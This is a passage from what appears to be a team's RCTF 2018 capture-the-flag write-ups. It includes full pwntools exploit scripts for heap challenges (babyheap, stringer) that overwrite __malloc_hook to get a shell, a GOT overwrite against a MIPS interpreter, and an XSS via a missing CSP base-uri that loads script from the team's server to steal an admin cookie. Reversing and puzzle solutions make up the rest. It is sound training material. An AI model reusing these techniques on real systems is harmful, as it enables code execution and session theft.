To leak libc, we can allocate a smallchunk (let's call it `unsorted`) that overlaps the previously allocated smallchunk (let's call it `leak`). Then, we free `unsorted` and use the show option on `leak` to get the `fd` pointer of `unsorted`. Since it is in the unsorted bin, its `fd` will point within `main_arena` in libc.

Now that we have libc, our goal is to link a fake fastchunk near `__malloc_hook`. Due to the presence of NULL pointers and valid libc pointers (0x7f top byte) before the hook, the qword at `&__malloc_hook-27` is exactly 0x7f. Since fastchunk sizes don't have to be aligned, this is a valid fastchunk header. We allocate a chunk that overlaps the freed 0x70 fastchunk from earlier, and we reconstruct it (it was zeroed by `calloc`) with an `fd` pointing to `&__malloc_hook-27-8` (`prev_size` is included). Now the fake fastchunk near the hook is linked in the 0x70 fastbin. We allocate a 0x70 fastchunk to bring the fake one to the fastbin head, and finally allocate the fake fastchunk. Now we simply overwrite `__malloc_hook` with a suitable onegadget (0x4526a in libc works), and obtain a shell on the next allocation.

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *

p = remote('babyheap.2018.teamrois.cn', 3154)

chunks = [False]*32

def menu(n):
    p.recvuntil('choice: ')
    p.sendline(str(n))

def alloc(size, content='', final=False):
    menu(1)
    p.recvuntil('size: ')
    p.sendline(str(size))
    if final:
        return
    p.recvuntil('content: ')
    p.send(content + ('\n' if len(content) < size else ''))
    idx = chunks.index(False)
    chunks[idx] = True
    return idx

def show(idx):
    menu(2)
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil('content: ')
    content = p.recvuntil('\n1. Alloc')[:-len('\n1. Alloc')]
    return content

def delete(idx):
    menu(3)
    p.recvuntil('index: ')
    p.sendline(str(idx))
    chunks[idx] = False

prog = log.progress('Setting up heap layout')
# layout: 0x18 (alloc) | 0x220 (free) | 0x110 (alloc)
bottom = alloc(0x18)
gap1 = alloc(0x100)
gap2 = alloc(0x100, 'A'*0xe0 + p64(0x200)) # shrunk prev_size
top = alloc(0x100)
alloc(0x18)
delete(gap1)
delete(gap2)
prog.success()

prog = log.progress('Shrinking free chunk')
delete(bottom)
# off-by-one NUL overflow into the 0x220 free chunk
alloc(0x18, 'A'*0x18)
prog.success()

prog = log.progress('Overlapping chunks')
head = alloc(0x88)
leak = alloc(0x88) # for unsorted leak
delete(alloc(0x68)) # for fastbin attack
delete(head)
delete(top)
prog.success()

prog = log.progress('Leaking libc')
alloc(0x88)
unsorted = alloc(0x88)
delete(unsorted)
libc_base = u64(show(leak).ljust(8, '\x00')) - 0x3c4b78
prog.success('@ 0x{:012x}'.format(libc_base))

prog = log.progress('Linking fake chunk')
malloc_hook = libc_base + 0x3c4b10
fake_fast_addr = malloc_hook - 27 - 8
alloc(0x100, 'A'*0x80 + 'B'*8 + p64(0x71) + p64(fake_fast_addr))
alloc(0x68)
prog.success()

prog = log.progress('Overwriting __malloc_hook')
one_gadget = libc_base + 0x4526a
alloc(0x68, 'A'*19 + p64(one_gadget))
prog.success()

log.info('Popping shell')
alloc(0x18, final=True)

p.interactive()

# $ cat flag
# RCTF{Let_us_w4rm_up_with_a_e4sy_NU11_byte_overflow_lul_7adf58}
```



rBlog 2018
--------------------

### Overview

We're greeted with a simple blog  platform, with the possibility to make the admin visit a post. Our objective is to steal the admin cookie.

We quickly found 2 potential XSS, a standard one in the title, and one in the style selector which allows to load local scripts (bypassing the CSP nonce).

The CSP is fairly strict, so we can't use inline js or script tags (because of the nonce): 
```default-src 'none'; script-src 'nonce-0672df2f3f6c548295847afc13c69f87'; frame-src https://www.google.com/recaptcha/; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'```

#### The intended solution

The intended solution was to upload a image, which contained valid JS code, and to execute the uploaded file using the script inclusion in the style selector.
However, most browsers block script with a audio/video/image MIMEtype, so the uploaded image had to be a WebP (which, apparently, has no MIMEtype).
This is very similar to the PlaidCTF2018 challenge idIoT: Action (with a WAVE file, but the execution is the same).
However, we solved it in another (probably unintended) way:

#### What real hackers do:

By checking carefully the CSP using https://csp-evaluator.withgoogle.com/, we realized the ```base-uri``` directive was missing.
This is a huge oversight: to solve the challenge, all we had to do was to put in the title ```<base href="http://ourserver.com/" target="_blank">```, and to set up ourserver.com to serve a malicious js file at http://npicca.ga:8000/assets/js/jquery.min.js, which will be loaded by the admin. 
We send the page to the admin and we get the cookies:
```RCTF{why_the_heck_no_mimetype_for_webp_in_apache2_in_8012}; hint_for_rBlog_Rev.2=http://rblog.2018.teamrois.cn/blog.php/52c533a30d8129ee4915191c57965ef4c7718e6d```

rBlog 2018 v2
-------------
In the hint from the previous solution, we found the screenshot of a command line running Parcel Development Server.
We run a copy of that on our server, and found out it has a feature called [Hot Module Replacement](https://parceljs.org/hmr.html). This feature includes a script in the boundle, that connects to a WebSocket server and listen for file updates.

The first problem is that the WebSocket port is randomized at every run of the server, unless specified in the command line (and from the screenshot it's not the case).
Luckily Parcel Development Server has really open [CORS Headers](https://github.com/parcel-bundler/parcel/blob/master/src/Server.js#L20).
We fetched the index and app.js pages using XMLHTTPRequest and found out the WebSocket port. We also found out the site is empty, just an empty html file and a `document.write` troll instruction.

We lost most of our time trying to force the page to connect to another WebSocket server, so we could push a custom update event and inject code into the page. Unfortunatly the address is taken from `location.hostname`, and there's no way to change that variable without loosing access to the cookies.
As a last resource, we decided to connect to the WebSocket server and listen from incoming updates, maybe someone is updating the files with the flag. Since WebSocket doesn't care about SOP, and we have have the address and the port, we just connected to it and sent every date we recieved to our server.
We received an update with the flag as a javascript comment in app.js, nice!

520gift
------- 
We are given a zip with 17 pics of different lipsticks, a cosmetic brand name and a hint about finding their color name first. As if that wasn't enough, reverse searching the images leads only to Chinese sites. And after a ridiculous amount of time, we finally found the original poster on weibo, and of course we need an account to see all her posts (which, of course, we cannot register because of the mobile number), but "luckily" we found a mirror which didn't require registration.
We then proceeded to examine a countless amount of lipstick pics, trying to match them with the 17 given to us, and in the end we end up with all the lipstick names. The initial letters of the first 4 names form "rctf", so we tried to add braces and fill with the other initials and it worked.

Number magic
------- 
After solving a POW, we are greeted with a message describing the game: we need to guess a sequence of `k` unique integers in a specified range (e.g. `[0,10)`) using up to a fixed number of guesses; after each guess we are given two integers as feedback (without specifying their nature).
After a couple of tries, it's pretty obvious that we are playing a variation of Mastermind (i.e. the feedback is the number of colors in the right position and the number of colors in the wrong position but present in the solution) where we cannot choose multiple colors, so we just need a solver for it. We end up writing the solver instead of using something else because it wasn't specified whether the number of pegs `k` or the number of colors could change.

### Code
```
from pwn import *
import hashlib, itertools, re, random

def scoreThis(guess, truth):
    a = 0
    for i in xrange(len(guess)):
        if guess[i] == truth[i]:
            a+=1
    b = len(set(guess).intersection(set(truth))) - a
    return a, b
def score(guess, S):
    worst = 0
    outcome = {}
    for s in S:
        z = scoreThis(guess, s)
        if z not in outcome: outcome[z] = 0
        outcome[z] += 1
    for k,v in outcome.items():
        worst = max(worst, v)
    return worst

def play(guess):
    r.sendline(" ".join(map(str, guess)))
    z = r.recvline()
    print z
    if "Nope" in z:
        z = z.replace(",","").split()
        return int(z[1]), int(z[2])
    else:
        return -1, -1

def solve(N, U, T):
    S = set(itertools.permutations(range(U), N))
    it = 0
    while (True):
        print "{}/{}".format(it, T)
        print len(S)
        if it > 0:
            guess = [len(S)+1, None]
            for s in S:
                sc = score(s, S)
                if sc < guess[0]:
                    guess = [sc, s]
        else:
            guess = [-1, [i for i in xrange(N)]]
        print guess
        guess = guess[1]
        a,b = play(guess)
        print a,b
        if a == -1:
            break
        rem = []
        for s in S:
            if scoreThis(guess, s) != (a,b):
                rem.append(s)
        for s in rem:
            S.remove(s)
        it += 1
    print list(S)[0]

r = remote('149.28.139.172', 10002)

def captcha(r):
    line = r.readline().strip()

    target = line.split(' ')[-1]
    suffix = line.split(')')[0].split('+')[1]

    print '[+] Captcha for', target, suffix

    alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for a,b,c,d in itertools.product(alpha, repeat=4):
        if hashlib.sha256(a+b+c+d+suffix).hexdigest() == target:
            r.sendline(a+b+c+d)
            return
    print '[x] no luck with captcha'
    exit(1)

captcha(r)

while True:
    try:
        r.recvuntil("=====")
    except:
        print r.clean(0)
        break
    print r.recvline().strip()
    l = r.recvline().strip()
    print l
    p = re.search("Give me (\d+) numbers, in\[0, (\d+)\), You can only try (\d+) times", l)
    N, U, T = map(lambda x: int(p.group(x)), range(1,4))
    print N, U, T
    solve(N,U,T)

r.interactive()
```

Simulator
------
[Attachment(original link)](https://drive.google.com/open?id=1KjU5NByCi1lqserfBs-JUbveE1tGUk7q)
### Overview

We are given a 32-bit Linux ELF executable which is a MIPS interpreter.
Checksec shows canaries and NX, but only partial RELRO and no PIE.
It accepts the following MIPS istructions: `add`, `sub`, `slt`, `and`, `or`, `syscall`, `beq`, `lw`, `sw`, `li`, `mov`, and `j`.
We have the usual registers: `zero`, `at`, `v0`, `v1`, `a0-a3`, `t0-t9`, `s0-s7`, `k0`, `k1`, `gp`, `sp`, `fp`, and `ra`.
Each register is stored in the BSS and the program reserves 4 bytes in order to store the content.
Two memory regions are mapped in order to store instructions (starts at 0x5000000) and data (starts at 0x4000000).
All the MIPS instructions we give to the program are executed by an interpreter that works on registers (in the BSS) and data (0x4000000).
Moreover, the `syscall` instruction with `v0` equal to 1 does a printf of the integer value stored in the register `t0`.

### Vulnerability

Our idea is to bypass the checks made by the `lw` and `sw` instructions to read (with the `syscall`) and write in other memory regions, outside the boundaries of the data mapping.
The check is:

```c
if (address > 1024)
    printf("Memory access error")
```

Here, `address` is signed.
Therefore, if we set the MSB the check passes.
The value of the address is then multiplied by 8, summed to 0x4000004 and truncated to 32 bits.
We can thus read and write 4 bytes at addresses that are congruent to 4 (mod 8).
Note that the result of the multiplication is not altered by the MSB we set, because of integer overflow.

### Leaking libc's position

This part requires a bit of math to get an arbitrary read on the GOT, where we leaked the address of `strcmp` and `strchr`.
We couldn't find the libc that was being used, so we first found the offset between `strcmp` and the libc base by going backwards 4K at a time until a crash (because there's nothing between the binary and libc).
To do this, we subtracted 0x4000004 from the `strcmp` address, divided by 8 (with an ad hoc MIPS function), set the MSB and then iterated in a cycle in which we attempt an `lw`, subtract 512 and repeat.
This is the script:

```python
#!/usr/bin/env python2

from pwn import *
import itertools
from hashlib import sha256

def pow(todo=False):
    if(todo ==  True):
        conn = remote("simulator.2018.teamrois.cn", 3131)
        chall = conn.recvuntil("\n").split("\n")[0]
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        for a,b,c,d in itertools.product(alpha, repeat=4):
            if(sha256(chall + a + b + c + d).digest().startswith('\0\0\0') == True):
                sol = a + b + c + d
                break;
        conn.sendline(sol)
        return conn
    else:
        return process('./simulator')

def div8():
    lines = []
    lines.append('li $v0, 0')
    lines.append('li $t0, 1')
    for i in reversed(range(3, 32)):
        lines.append('li $t1, {}'.format(2**i))
        lines.append('slt $t2, $a0, $t1')
        lines.append('beq $t2, $t0, div8_{}'.format(i-1))
        lines.append('sub $a0, $a0, $t1')
        lines.append('li $t1, {}'.format(2**(i-3)))
        lines.append('add $v0, $v0, $t1')
        lines.append('div8_{}:'.format(i-1))
    return '\n'.join(lines)

# leak strcmp, go back 4k until crash
code = """
li $t0, 2155911681
lw $a0, $t0
li $v0, 1
syscall
sub $a0, $a0, 67108868
""" + div8() + """
li $t0, 2147483648
add $a0, $v0, $t0
find_base:
lw $t0, $a0
li $v0, 1
syscall
sub $a0, $a0, 512
j find_base
"""

prog = log.progress('Solving PoW')
conn = pow(True)
prog.success()

prog = log.progress('Sending code')
conn.sendline(code)
conn.sendline('END')
prog.success()

prog = log.progress('Leaking strcmp')
strcmp = int(conn.recvline()) & 0xffffffff
prog.success('0x{:08x}'.format(strcmp))

prog = log.progress('Finding libc base')
try:
    while True:
        val = int(conn.recvline())
        libc = ((val * 8 + 0x4000004) & 0xffffffff) & ~0xfff
except (EOFError, ValueError):
    pass
prog.success('0x{:08x}'.format(libc))

log.info('Offset = 0x{:x}'.format(strcmp - libc))
```

### Dumping libc

Now that we know where the libc base is (relative to `strcmp`), we wrote another script to dump libc.
The address calculation is very similar to the previous script.
We can only read at addresses congruent to 4 (mod 8), so we'll get a dump that alternates between 4 unknown bytes and 4 leaked bytes.
This is the script:

```python
#!/usr/bin/env python2

from pwn import *
import itertools
from hashlib import sha256

def pow(todo=False):
    if(todo ==  True):
        conn = remote("simulator.2018.teamrois.cn", 3131)
        chall = conn.recvuntil("\n").split("\n")[0]
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        for a,b,c,d in itertools.product(alpha, repeat=4):
            if(sha256(chall + a + b + c + d).digest().startswith('\0\0\0') == True):
                sol = a + b + c + d
                break;
        conn.sendline(sol)
        return conn
    else:
        return process('./simulator')

def div8():
    lines = []
    lines.append('li $v0, 0')
    lines.append('li $t0, 1')
    for i in reversed(range(3, 32)):
        lines.append('li $t1, {}'.format(2**i))
        lines.append('slt $t2, $a0, $t1')
        lines.append('beq $t2, $t0, div8_{}'.format(i-1))
        lines.append('sub $a0, $a0, $t1')
        lines.append('li $t1, {}'.format(2**(i-3)))
        lines.append('add $v0, $v0, $t1')
        lines.append('div8_{}:'.format(i-1))
    return '\n'.join(lines)

STRCMP_LIBC_OFF = 0x13a6b0

code = """
li $t0, 2155911681
lw $a0, $t0
sub $a0, $a0, {}
li $v0, 1
syscall
sub $a0, $a0, 67108860
""".format(STRCMP_LIBC_OFF) + div8() + """
li $t0, 2147483648
add $t0, $v0, $t0
dump:
lw $a0, $t0
li $v0, 1
syscall
add $t0, $t0, 1
j dump
"""

prog = log.progress('Solving PoW')
conn = pow(True)
prog.success()

prog = log.progress('Sending code')
conn.sendline(code)
conn.sendline('END')
prog.success()

prog = log.progress('Leaking libc')
libc = int(conn.recvline()) & 0xffffffff
prog.success('0x{:08x}'.format(libc))

prog = log.progress('Dumping libc')
with open('libc_dump', 'wb') as f:
    try:
        while True:
            val = int(conn.recvline()) & 0xffffffff
            f.write('\x00'*4 + p32(val))
    except (EOFError, ValueError):
        pass
prog.success()
```

We determined that the dump corresponded to libc `2.23-0ubuntu10` (32 bit), which we should have figured out earlier, as it's the 32 bit version of the same libc used in all the other pwnables... oh well.
Let's exploit this.
We decided to go with a GOT overwrite (through `sw`).
We noticed that there aren't calls to GOT functions with a controlled first argument (i.e., hijackable to `system`) after executing MIPS code.
However, the instruction reading loop, which happens before executing code, calls `strncmp` with user input as the first argument.
Since we can get a call to `puts` at the end of code execution to print `Unknown instruction`, we first overwrote the GOT entry for `strncmp` to `system`, and then overwrote the GOT entry for `puts` to `main`.
When calling `puts`, the simulator will restart and a line of input will be passed as first argument to `strncmp`, which is now `system`.
Now we can call `system("sh")` and pop a shell:

```
$ cat flag
RCTF{5imu_s1mu_sinnu_siml_l_simulator!_7a3dac}
```

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *
import itertools
from hashlib import sha256

def pow(todo=False):
    if(todo ==  True):
        conn = remote("simulator.2018.teamrois.cn", 3131)
        chall = conn.recvuntil("\n").split("\n")[0]
        alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        for a,b,c,d in itertools.product(alpha, repeat=4):
            if(sha256(chall + a + b + c + d).digest().startswith('\0\0\0') == True):
                sol = a + b + c + d
                break;
        conn.sendline(sol)
        return conn
    else:
        return process('./simulator')

STRCMP_LIBC_OFF = 0x1396b0
SYSTEM_OFF = 0x3a940
MAIN = 0x0804ac58

# strncmp = system()
# puts = MAIN
code = """
li $t0, 2155911681
lw $t1, $t0
sub $t1, $t1, {}
add $t1, $t1, {}
li $t0, 2155911689
sw $t1, $t0
li $t0, 2155911684
li $t1, {}
sw $t1, $t0
""".format(STRCMP_LIBC_OFF, SYSTEM_OFF, MAIN)

prog = log.progress('Solving PoW')
conn = pow(True)
prog.success()

prog = log.progress('Sending code')
conn.sendline(code)
conn.sendline('END')
prog.success()

log.info('Popping shell')
conn.sendline('sh')

conn.interactive()
```


stringer
--------

### Overview

We're given a 64-bit Linux ELF and its libc (2.23).
Checksec shows full RELRO, canaries, NX and PIE.

During initialization, a randomly-sized chunk is allocated on the heap to shift the user allocations by a random offset.
Then, the program shows a basic menu:

```
1. New string
2. Show string
3. Edit string
4. Delete string
5. Exit
```

Option 1 allows us to allocate a string.
It asks for a length (up to 256), then it `calloc`s that length and copies our input into it.
We can allocate up to 32 strings.
Option 2 just outputs `don't even think about it`.
Option 3 can be used to "edit" a string.
It asks for an offset inside of a string, and increments the byte at that offset.
We can do at most five increments per string.
Option 4 frees a string.

### Vulnerabilities

The first thing we notice is an obvious use-after-free triggered by deleting a string:

```c
void delete_string()
{
    unsigned int idx;
    char *str;

    printf("please input the index: ");
    idx = read_int();
    if (idx > 31)
        die("not a validate index");
    str = strings[idx];
    if (!str)
        die("not a validate index");
    free(str);
}
```

Where `strings` is a global array of pointers to allocated strings.
Entries in this array are added by the new string option, and the edit string option considers an index valid if its entry is not NULL.
However, `delete_string` does not set the entry to NULL after freeing.
Therefore, we can edit a freed string, or free a string multiple times.

There's another, more subtle issue when adding a string.
This is the code for `new_string`:

```c
void new_string()
{
    long i;
    unsigned int len;
    char *str;

    if (num_strings > 32)
        die("too many string");

    printf("please input string length: ");
    len = read_int();
    if (!len || len > 256)
        die("invalid size");

    str = (char *) calloc(len, 1);
    if (!str)
        die("memory error");

    printf("please input the string content: ");
    read_line(str, len);

    for (i = 0; i <= 31 && strings[i]; ++i);
    if (i > 31)
        die("too many string");

    strings[i] = str;
    printf("your string: %s\n", str);
    ++num_strings;
    string_len[i] = len;
}
```

And this is the code for `read_line`:

```c
void read_line(char *buf, unsigned int size)
{
    char c;
    unsigned int i;

    for (i = 0; i < size; ++i) {
        c = 0;
        if (read(0, &c, 1uLL) < 0)
            die("read() error");
        buf[i] = c;
        if (c == '\n')
            break;
    }
    buf[size - 1] = 0;
}
```

It seems that the string creation could be used to leak memory.
Notice the behaviour of `read_line` when it encounters a newline: it stops reading, it doesn't replace the newline with a zero, and then zero-terminates the string _based on the buffer size_, not on the actual read length.
Then, `new_string` prints out the string _from the heap chunk_ using `%s`, which stops at the zero terminator.
So, if we allocate a string on top of a free chunk that contains some data we want to leak (e.g., pointers), then send a short string (e.g., only a newline, so that we only overwrite one byte), we'll leak the data up to the first zero.
This sounds really nice, until you notice the string is `calloc`ed, so any data in the free chunk is destroyed.
However, as we'll see, there's a way around that...

### Breaking `calloc`

Apparently, we don't have any leaks.
I fiddled for a bit, trying to come up with a way to exploit this challenge using only the UAF on edit and delete, but I got nowhere.
So I went back to the almost-but-not-quite infoleak I described earlier, asking myself whether there are cases in which `calloc` doesn't clear the memory.
Mmapped chunks came to mind.
Normally, the GNU libc allocator asks the OS for memory (either through `sbrk` or `mmap`), and then hands out chunks of it to the application.
However, for particularly big allocations, the allocator will directly `mmap` the chunk and hand it out to the application.
This is signaled by the `IS_MMAPPED` flag in the chunk header.
Obviously, `mmap`ed memory is already zeroed by the OS, so `calloc` shouldn't need to clear it.
The [source code](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=39e42989d32c0c3c1fd325f58dcc38ea7ee38364;hb=refs/heads/release/2.23/master#l3256) confirms this:

```c
mem = _int_malloc (av, sz);
/* ... */
p = mem2chunk (mem);

/* Two optional cases in which clearing not necessary */
if (chunk_is_mmapped (p))
 {
   if (__builtin_expect (perturb_byte, 0))
     return memset (mem, 0, sz);

   return mem;
 }
```

Here, `chunk_is_mmapped` just checks whether `IS_MMAPPED` is set for the chunk.
Unless malloc's debug features are enabled (they're not here), `perturb_byte` is zero, so nothing is cleared.
We're not interested in real mmapped chunks (we can't allocate them anyway), but with some massaging we can exploit the UAF to edit a freed chunk's header and set the `IS_MMAPPED` flag.
If then `_int_malloc` returns our chunk to `__libc_calloc`, it won't be cleared.
Profit!

### Leaking libc

We'll need to know libc's position in memory for further exploitation.
The typical way to leak libc through a heap leak is to read a link pointer from the first or the last chunk in the unsorted bin, as it will point inside `main_arena` in libc's data section.
So, in our case, we'll have to set `IS_MMAPPED` for an unsorted chunk, then allocate a string on top of it.
Clearly, we don't want this allocation to mess with the flag we just set.
The best path to take is an [exact fit](https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=39e42989d32c0c3c1fd325f58dcc38ea7ee38364;hb=refs/heads/release/2.23/master#l3516):

```c
/* Take now instead of binning if exact fit */
if (size == nb)
 {
   set_inuse_bit_at_offset (victim, size);
   if (av != &main_arena)
     victim->size |= NON_MAIN_ARENA;
   check_malloced_chunk (av, victim, nb);
   void *p = chunk2mem (victim);
   alloc_perturb (p, bytes);
   return p;
 }
```

So this is what we'll do (I chose the smallest sizes possible - string size is 8 bytes less than chunk size):
1. Allocate a 0xB0 smallchunk (call it `dangling`), followed by a 0x20 fastchunk (to avoid consolidation of free chunks with the top chunk);
2. Free `dangling`: this sets up the UAF to corrupt the flags;
2. Allocate a 0x20 fastchunk (call it `spacer`), followed by a 0x90 smallchunk (call it `victim`) - note that those exactly fill `dangling`;
3. Free `victim`, which goes into the unsorted bin;
4. Edit `dangling` (its saved length is big enough to reach `victim`), incrementing the LSB of `victim`'s size (offset 0x18) twice to set `IS_MMAPPED` - that's why we needed `spacer`, otherwise `victim`'s header would've been before the string data;
5. Allocate a 0x90 chunk with `\n` content, which will exactly fit into `victim`, and watch the challenge spew out a libc address (the LSB is corrupted to `\n`, but that's irrelevant).

### Getting a shell

Now that we have libc, there are a bunch of attacks we can do to gain code execution.
I chose to allocate a fake fastchunk on top of `__malloc_hook` and jump to a onegadget to pop a shell.
Because the memory around `__malloc_hook` contains library function pointers (0x7F top byte) and NULL pointers, interpreting the data at `&__malloc_hook-27` as a quadword yields 0x7F, which is a valid fastchunk header for the 0x70 fastbin.
Let's start with a fastbin dup through the UAF.
We allocate two 0x70 fastchunks (`dup` and `mid`), then free `dup`, `mid`, and `dup` again, thus bypassing the fastbin double-free checks.
The fastbin freelist is now `dup -> mid -> dup`.
Now we allocate a 0x70 fastchunk (which will reuse `dup`) and set the `fd` pointer to `&__malloc_hook-27-8` (accounting for `prev_size`).
The fastbin freelist is now `mid -> dup -> &__malloc_hook-27-8`.
We just need a couple 0x70 allocations to get the first two out of the way, and the next allocation will return our fake chunk, allowing us to overwrite `__malloc_hook`.
One more allocation to trigger the hook, and we have a shell!

```
$ cat flag
RCTF{Is_th1s_c1-1unk_m4pped?_df3ac9}
```

### Exploit code

```python
#!/usr/bin/env python2

from pwn import *

p = remote('stringer.2018.teamrois.cn', 7272)

chunk_idx = 0

def menu(n):
    p.recvuntil('choice: ')
    p.sendline(str(n))

def alloc(size, content='', final=False):
    global chunk_idx
    menu(1)
    p.recvuntil('length: ')
    p.sendline(str(size))
    if final:
        return
    p.recvuntil('content: ')
    p.send(content + ('\n' if len(content) < size else ''))
    p.recvuntil('your string: ')
    s = p.recvuntil('\n1.')[:-3]
    chunk_idx += 1
    return (chunk_idx-1, s)

def increment_byte(idx, offset):
    menu(3)
    p.recvuntil('index: ')
    p.sendline(str(idx))
    p.recvuntil('index: ')
    p.sendline(str(offset))

def free(idx):
    menu(4)
    p.recvuntil('index: ')
    p.sendline(str(idx))

prog = log.progress('Leaking libc')
dangling, _ = alloc(0xa8)
alloc(0x18) # stop consolidation with top chunk
free(dangling)
alloc(0x18) # spacer
victim, _ = alloc(0x88)
free(victim)
# set IS_MMAPPED on freed victim
for _ in range(2):
    increment_byte(dangling, 0x18)
# exact fit into victim unsorted
_, leak = alloc(0x88)
libc_base = u64(leak.ljust(8, '\x00')) - 0x3c4b0a
prog.success('@ 0x{:012x}'.format(libc_base))

prog = log.progress('Double-freeing fastchunk')
dup, _ = alloc(0x68)
mid, _ = alloc(0x68)
free(dup)
free(mid)
free(dup)
prog.success()

prog = log.progress('Linking fake chunk')
malloc_hook = libc_base + 0x3c4b10
fake_fast_addr = malloc_hook - 27 - 8
alloc(0x68, p64(fake_fast_addr))
alloc(0x68) # remove mid
alloc(0x68) # remove dup
prog.success()

prog = log.progress('Overwriting __malloc_hook')
one_gadget = libc_base + 0xf02a4
alloc(0x68, 'A'*19 + p64(one_gadget))
prog.success()

log.info('Popping shell')
alloc(0x18, final=True)

p.interactive()
```



Simple vm
---

We're given two files, a vm and a bytecode. By disassembling the vm it's easy to see what each instruction does and how it's saved in memory - it's all in `sub_400896`. As the function itself is quite long I won't copy it here, it's enough to see what each instruction does. In the following table, all items in `<` and `>` brackets are the values given right after the opcode.

|opcode|size in bytes|description|
|:----:|:-----------:|-----------|
|  00  |    5        | `exit(<exitcode>)`
|  01  |    5        | `jump <address>`
|  02  |    9        | `mov *<address>, <value>`
|  03  |    5        | `c = *<address>`
|  04  |    5        | `*<address> = c`
|  05  |    5        | `d = *<address>`
|  06  |    5        | `*<address> = d`
|  07  |    1        | `c += d`
|  08  |    1        | `c = ~(c & d)`
|  09  |    1        | Unused
|  0A  |    1        | `c = getchar()`
|  0B  |    1        | `putchar(c)`
|  0C  |    9        | `if(*<address> != 0) { *<address> -= 1; jump <target> }`
|  0D  |    1        | `c += 1`
|  0E  |    1        | `d += 1`
|  0F  |    1        | `c = d`
|  10  |    1        | `d = c`
|  11  |    5        | `c += <value>`
|  12  |    1        | `c = *d`
|  13  |    1        | `c = *c`
|  14  |    5        | `c = <value>`
|  15  |    5        | `d = <value>`
|  16  |    1        | `*d = c`
|  17  |    1        | `c -= d`
|  18  |    5        | `if(c != 0) { jump <target> }`
|  66  |    1        | Implicitly used as a nop

`c` and `d` are the two registers the vm can work with.

Having a full instruction mapping, I disassembled the given bytecode into this:

```
# All values are hex

000: jmp 030

005: encoded data

030: d = 100
035: d++
036: c = *d
037: putchar(c)
038: if byte *100:
         dec byte *100
                 jmp 035
041: nop

042: d = 110
047: d += 1
048: c = getchar()
049: nop
04A: *d = c
04B: if byte *110:
         dec byte *110
                 jmp 047
054: nop

055: c = *140
05A: d = c
05B: c += F1
060: c = *c
061: *143 = c
066: c = ~(c & d)
067: *141 = c
06C: d = c
06D: c = *140
072: c = ~(c & d)
073: *142 = c
078: c = *141
07D: c = *143
082: c = ~(c & d)
083: d = c
084: c = *142
089: c = ~(c & d)
08A: *144 = c
08F: nop
090: c = *140
095: c += 0xF1
09A: d = c
09B: c = *144
0A0: *d = c
0A1: d = *140
0A6: d += 1
0A7: *140 = d
0AC: if byte *145:
         dec byte *145
                 jmp 055
0B5: nop
0B6: c = *146
0BB: c += 5
0C0: c = *c
0C1: d = c
0C2: c = *146
0C7: c += 111
0CC: c = *c
0CD: c -= d
0CE: if c:
         jmp 160
0D3: if byte *146:
         dec byte *146:
                 jmp 0B6
0DC: jmp 176

101: 'Input Flag:'
151: 'Wrong'
157: 'Right'

160: d = 150
165: d += 1
166: c = *d
167: putchar(c)
168: if byte *150:
         dec byte *150
                 jmp 165
171: exit(0)

176: d = 156
17B: d += 1
17C: c = *d
17D: putchar(c)
17E: if byte *150:
         dec byte *150
                 jmp 17B
187: exit(0)
```

The code reads the flag into offset 0x111, transforms it in instructions 055-0B5 and compares it to the encrypted data at 005, jumping to 176 and printing `Right` if the flag is correct. We converted the transformation into a python function to find each individual character of the flag. Since each one was checked individually we could bruteforce each one and build up our result with the following code:

```python
#!/usr/bin/env python2

def transform(c, pos):
        m140 = 0x20 + pos
        m141 = ~(c & m140)
        m142 = ~(m140 & m141)
        m144 = ~(m142 & ~(m141 & c));
        return m144

with open('p.bin', 'rb') as f:
        code = f.read()

magic = map(ord, code[5:5+32])

flag = ''
for pos in range(32):
        for c in range(0x20, 0x7f):
                if transform(c, pos) == magic[pos]:
                        flag += chr(c)
                        break
        print(flag)
```

Which outputs `09a71bf084a93df7ce3def3ab1bd61f6`. The flag is thus `RCTF{09a71bf084a93df7ce3def3ab1bd61f6}`



Babyre
---

We are given two files, a 32 bit executable and a file called `out`. At first the program doesn't print anything when executed, but by opening it in a disassembler it's easy to see that it accepts a string and then a number, which has to be between 10 and 32. I started playing around with these two inputs only to realize they weren't actually used in producing the output.

#### sub_80488E0

This is where the magic happens. The function reads a string and mangles each of the characters to a 32 bit integer, which is then printed in hex.
```c
int __cdecl sub_80488E0(char *s, int a2, int a3, int a4, int a5, int a6)
{
  unsigned int v6; // ST4C_4
  signed int i; // [esp+1Ch] [ebp-1Ch]

  memset(s, 0, 0x20u);
  scanf("%s", s);
  for ( i = 0; i <= 29; ++i )
  {
    v6 = sub_804868B(s[i], __PAIR__(a3, a2), a4, a6, a5);
    printf("%lx\n", v6);
  }
  return i;
}
```

The only called function, `sub_804868B`, is responsible for the mangling of individual characters. While it gets a lot of parameters, in the end the last three are useless and `__PAIR__(a3, a2)` is hardcoded in the main function as `0x1D082C23A72BE4C1LL`. Let's have a look at `sub_804868B`:

```c
unsigned int __cdecl sub_804868B(unsigned int a1, unsigned __int64 a2, int a3, int a4, int a5)
{
  unsigned __int64 v5; // rax
  unsigned int i; // [esp+1Ch] [ebp-ACh]
  unsigned int j; // [esp+24h] [ebp-A4h]
  int v10; // [esp+28h] [ebp-A0h]
  int s[32]; // [esp+2Ch] [ebp-9Ch]
  unsigned int v12; // [esp+ACh] [ebp-1Ch]

  v12 = __readgsdword(0x14u);
  memset(s, 0, 0x20u);
  for ( i = 0; i <= 0x1D; ++i )
    s[i] = (4 * a3 + v10) ^ a5 ^ a4;
  for ( j = 0; j <= 0x20F; ++j )
  {
    v5 = a2 >> (j & 0x1F);
    if ( j & 0x20 )
      LODWORD(v5) = HIDWORD(v5);
    a1 = (a1 >> 1) ^ (((unsigned int)v5 ^ a1 ^ (a1 >> 16) ^ (0x5C743A2E >> (((a1 >> 1) & 1)
                                                                          + 2
